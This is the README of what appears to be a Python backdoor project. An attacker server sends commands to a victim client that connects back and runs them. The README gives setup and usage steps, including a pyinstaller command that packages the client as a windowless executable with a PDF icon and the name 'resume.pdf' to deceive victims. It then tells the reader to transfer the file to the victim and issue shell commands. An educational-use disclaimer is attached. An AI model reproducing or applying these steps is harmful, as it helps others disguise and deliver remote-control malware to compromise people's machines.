# Backdoor Tool

This project demonstrates a simple backdoor tool for educational purposes. It consists of two components:
1. **Attacker Script (`attacker.py`)**: A server that listens for incoming connections and sends commands to the client.
2. **Victim Executable (`victim.exe`) and Victim Script (`victim.py`)**: A client that connects to the attacker and executes received commands.

**Disclaimer**: This tool is for educational purposes only. Use it responsibly and only in environments where you have explicit permission. Misuse of this tool is illegal and unethical.

---

## Prerequisites

- Python 3.x
- `pyinstaller` (for generating the victim executable)

---

## Setup

### 1. Install Dependencies
Install the required Python package (`pyinstaller`) on the attacker machine:
```bash
pip install pyinstaller
```

### 2. Generate the Victim Executable
On the attacker machine, navigate to the directory containing victim.py and run the following command to generate the executable:
```bash
pyinstaller --onefile --noconsole --icon=pdf_icon.ico --name=resume.pdf victim.py
```
This will create a standalone executable named resume.pdf in the dist folder.

---

## Usage

### 1. Start the Attacker Server
Run the attacker.py script on the attacker machine:
```bash
python attacker.py
```
The server will start listening for incoming connections on the specified IP and port.

### 2. Run the Victim Executable
Transfer the generated resume.pdf file to the victim machine and execute it. The victim will connect to the attacker server.

### 3. Send Commands
Once the victim connects, you can send commands from the attacker's terminal. For example:
```bash
Shell> dir
Shell> whoami
```
To exit, type exit.

---

## File Descriptions

- `attacker.py`: The server script that listens for incoming connections and sends commands to the victim.
- `victim.py`: The client script that connects to the attacker and executes received commands.
- `pdf_icon.ico`: The icon used for the generated executable to make it look like pdf file.
- `resume.pdf.exe`: The generated victim executable containing the victim's code.

---

## Important Notes

- **Ethical Use**: Only use this tool in environments where you have explicit permission. Unauthorized use is illegal.
- **Security**: Be cautious when running executables from untrusted sources. Always verify file integrity.
- **Testing**: Use this tool for educational purposes only. Do not use it for malicious activities.